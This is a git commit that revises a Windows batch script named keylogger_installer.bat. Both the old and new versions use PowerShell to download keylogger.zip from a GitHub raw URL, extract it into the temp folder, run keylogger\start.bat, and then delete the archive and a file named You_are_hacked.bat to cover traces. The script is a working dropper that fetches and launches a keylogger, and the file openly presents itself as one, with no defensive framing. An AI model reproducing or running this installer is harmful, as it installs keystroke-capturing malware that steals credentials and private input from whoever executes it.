3f540256cc0d11add6e1fd4bcd232f7d224dc948
triggerhappy_ <questcraft.online@gmail.com>
2025-04-29 16:37:25 +0200

    Update keylogger_installer.bat

--- keylogger_installer.bat
+++ keylogger_installer.bat
@@ -1,8 +1,17 @@
 @echo off
-set "u=https://github.com/Questcraft-Online/OMG_online_storage/raw/refs/heads/main/keylogger.zip"
-set "d=%TEMP%" & set "z=%d%\repo.zip"
-powershell -Command "Invoke-WebRequest '%u%' -OutFile '%z%'"
-powershell -Command "Expand-Archive '%z%' '%d%' -Force"
-call "%d%\keylogger\start.bat"
-DEL "%z%" "%d%\You_are_hacked.bat"
+setlocal
+set "ZIP_URL=https://github.com/Questcraft-Online/OMG_online_storage/raw/refs/heads/main/keylogger.zip"
+set "DOWNLOAD_DIR=%TEMP%"
+set "ZIP_FILE=%DOWNLOAD_DIR%\repo.zip"
+set "EXTRACT_DIR=%TEMP%"
+if not exist "%DOWNLOAD_DIR%" mkdir "%DOWNLOAD_DIR%"
+if not exist "%EXTRACT_DIR%" mkdir "%EXTRACT_DIR%"
+powershell -Command "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%ZIP_FILE%' | Out-Null"
+powershell -Command "Expand-Archive -Path '%ZIP_FILE%' -DestinationPath '%EXTRACT_DIR%' -Force"
+pushd "%EXTRACT_DIR%"
+call "%EXTRACT_DIR%\keylogger\start.bat"
+:done
+popd
+del "%ZIP_FILE%"
+del "%TEMP%\You_are_hacked.bat"
 exit
